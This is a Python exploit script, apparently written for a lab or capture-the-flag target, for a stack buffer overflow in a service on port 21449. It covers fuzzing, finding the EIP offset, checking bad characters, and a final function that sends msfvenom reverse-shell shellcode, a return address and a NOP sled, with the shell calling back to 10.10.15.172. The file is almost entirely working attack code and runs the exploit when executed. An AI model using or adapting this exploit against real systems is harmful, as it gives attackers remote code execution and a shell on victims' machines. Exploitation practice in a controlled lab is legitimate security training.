from struct import pack
import socket

IP="127.0.0.1"
PORT=21449

def find_buffer_size():
    try:
        for i in range(0,10000,500):
            print(f"fuzzing {i} bytes")
            buffer=b"A"*i
            s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((IP,PORT))
            s.send(buffer)
            s.close()
    except:
        print("cant connect")

def find_eip_offset():
    pattern=bytes("Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac"
                "9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8"
                "Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7A"
                "i8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al"
                "7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6"
                "Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq","utf-8")
    
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP,PORT))
    s.send(pattern)
    s.close()

def confirm_eip_offset():
    offset=469
    buffer=b"A"*offset
    eip=b"BBBB"

    tosend=buffer + eip

    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP,PORT))
    s.send(tosend)
    s.close()

def confirm_bad_chars():
    bad_chars=bytes([
    0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
    0x08, 0x09, 0x0B, 0x0C, 0x0E, 0x0F,
    0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17,
    0x18, 0x19, 0x1A, 0x1B, 0x1C, 0x1D, 0x1E, 0x1F,
    0x20, 0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27,
    0x28, 0x29, 0x2A, 0x2B, 0x2C, 0x2D, 0x2E, 0x2F,
    0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37,
    0x38, 0x39, 0x3A, 0x3B, 0x3C, 0x3D, 0x3E, 0x3F,
    0x40, 0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47,
    0x48, 0x49, 0x4A, 0x4B, 0x4C, 0x4D, 0x4E, 0x4F,
    0x50, 0x51, 0x52, 0x53, 0x54, 0x55, 0x56, 0x57,
    0x58, 0x59, 0x5A, 0x5B, 0x5C, 0x5D, 0x5E, 0x5F,
    0x60, 0x61, 0x62, 0x63, 0x64, 0x65, 0x66, 0x67,
    0x68, 0x69, 0x6A, 0x6B, 0x6C, 0x6D, 0x6E, 0x6F,
    0x70, 0x71, 0x72, 0x73, 0x74, 0x75, 0x76, 0x77,
    0x78, 0x79, 0x7A, 0x7B, 0x7C, 0x7D, 0x7E, 0x7F,
    0x80, 0x81, 0x82, 0x83, 0x84, 0x85, 0x86, 0x87,
    0x88, 0x89, 0x8A, 0x8B, 0x8C, 0x8D, 0x8E, 0x8F,
    0x90, 0x91, 0x92, 0x93, 0x94, 0x95, 0x96, 0x97,
    0x98, 0x99, 0x9A, 0x9B, 0x9C, 0x9D, 0x9E, 0x9F,
    0xA0, 0xA1, 0xA2, 0xA3, 0xA4, 0xA5, 0xA6, 0xA7,
    0xA8, 0xA9, 0xAA, 0xAB, 0xAC, 0xAD, 0xAE, 0xAF,
    0xB0, 0xB1, 0xB2, 0xB3, 0xB4, 0xB5, 0xB6, 0xB7,
    0xB8, 0xB9, 0xBA, 0xBB, 0xBC, 0xBD, 0xBE, 0xBF,
    0xC0, 0xC1, 0xC2, 0xC3, 0xC4, 0xC5, 0xC6, 0xC7,
    0xC8, 0xC9, 0xCA, 0xCB, 0xCC, 0xCD, 0xCE, 0xCF,
    0xD0, 0xD1, 0xD2, 0xD3, 0xD4, 0xD5, 0xD6, 0xD7,
    0xD8, 0xD9, 0xDA, 0xDB, 0xDC, 0xDD, 0xDE, 0xDF,
    0xE0, 0xE1, 0xE2, 0xE3, 0xE4, 0xE5, 0xE6, 0xE7,
    0xE8, 0xE9, 0xEA, 0xEB, 0xEC, 0xED, 0xEE, 0xEF,
    0xF0, 0xF1, 0xF2, 0xF3, 0xF4, 0xF5, 0xF6, 0xF7,
    0xF8, 0xF9, 0xFA, 0xFB, 0xFC, 0xFD, 0xFE, 0xFF])

    offset=469
    buffer=b"A"*offset
    eip=b"BBBB"

    tosend=buffer + eip + bad_chars

    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP,PORT))
    s.send(tosend)
    s.close()

def exploit():
    # msfvenom -p windows/shell_reverse_tcp -f 'python' LHOST=10.10.15.172 LPORT=1234 -b '\x00\x0a\x0d'
    buf =  b""
    buf += b"\xda\xc8\xd9\x74\x24\xf4\x5a\x33\xc9\xb1\x52\xbd\xa7"
    buf += b"\xad\xa2\x9d\x31\x6a\x17\x03\x6a\x17\x83\x65\xa9\x40"
    buf += b"\x68\x95\x5a\x06\x93\x65\x9b\x67\x1d\x80\xaa\xa7\x79"
    buf += b"\xc1\x9d\x17\x09\x87\x11\xd3\x5f\x33\xa1\x91\x77\x34"
    buf += b"\x02\x1f\xae\x7b\x93\x0c\x92\x1a\x17\x4f\xc7\xfc\x26"
    buf += b"\x80\x1a\xfd\x6f\xfd\xd7\xaf\x38\x89\x4a\x5f\x4c\xc7"
    buf += b"\x56\xd4\x1e\xc9\xde\x09\xd6\xe8\xcf\x9c\x6c\xb3\xcf"
    buf += b"\x1f\xa0\xcf\x59\x07\xa5\xea\x10\xbc\x1d\x80\xa2\x14"
    buf += b"\x6c\x69\x08\x59\x40\x98\x50\x9e\x67\x43\x27\xd6\x9b"
    buf += b"\xfe\x30\x2d\xe1\x24\xb4\xb5\x41\xae\x6e\x11\x73\x63"
    buf += b"\xe8\xd2\x7f\xc8\x7e\xbc\x63\xcf\x53\xb7\x98\x44\x52"
    buf += b"\x17\x29\x1e\x71\xb3\x71\xc4\x18\xe2\xdf\xab\x25\xf4"
    buf += b"\xbf\x14\x80\x7f\x2d\x40\xb9\x22\x3a\xa5\xf0\xdc\xba"
    buf += b"\xa1\x83\xaf\x88\x6e\x38\x27\xa1\xe7\xe6\xb0\xc6\xdd"
    buf += b"\x5f\x2e\x39\xde\x9f\x67\xfe\x8a\xcf\x1f\xd7\xb2\x9b"
    buf += b"\xdf\xd8\x66\x0b\x8f\x76\xd9\xec\x7f\x37\x89\x84\x95"
    buf += b"\xb8\xf6\xb5\x96\x12\x9f\x5c\x6d\xf5\xaa\xaa\x62\xa9"
    buf += b"\xc3\xa8\x7c\xb5\xc1\x24\x9a\xdf\xf5\x60\x35\x48\x6f"
    buf += b"\x29\xcd\xe9\x70\xe7\xa8\x2a\xfa\x04\x4d\xe4\x0b\x60"
    buf += b"\x5d\x91\xfb\x3f\x3f\x34\x03\xea\x57\xda\x96\x71\xa7"
    buf += b"\x95\x8a\x2d\xf0\xf2\x7d\x24\x94\xee\x24\x9e\x8a\xf2"
    buf += b"\xb1\xd9\x0e\x29\x02\xe7\x8f\xbc\x3e\xc3\x9f\x78\xbe"
    buf += b"\x4f\xcb\xd4\xe9\x19\xa5\x92\x43\xe8\x1f\x4d\x3f\xa2"
    buf += b"\xf7\x08\x73\x75\x81\x14\x5e\x03\x6d\xa4\x37\x52\x92"
    buf += b"\x09\xd0\x52\xeb\x77\x40\x9c\x26\x3c\x70\xd7\x6a\x15"
    buf += b"\x19\xbe\xff\x27\x44\x41\x2a\x6b\x71\xc2\xde\x14\x86"
    buf += b"\xda\xab\x11\xc2\x5c\x40\x68\x5b\x09\x66\xdf\x5c\x18"

    offset=469
    buffer=b"A"*offset
    nop=b"\x90"*32
    eip=pack('<L',0x621014E3)

    tosend=buffer + eip + nop + buf

    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP,PORT))
    s.send(tosend)
    s.close()

exploit()




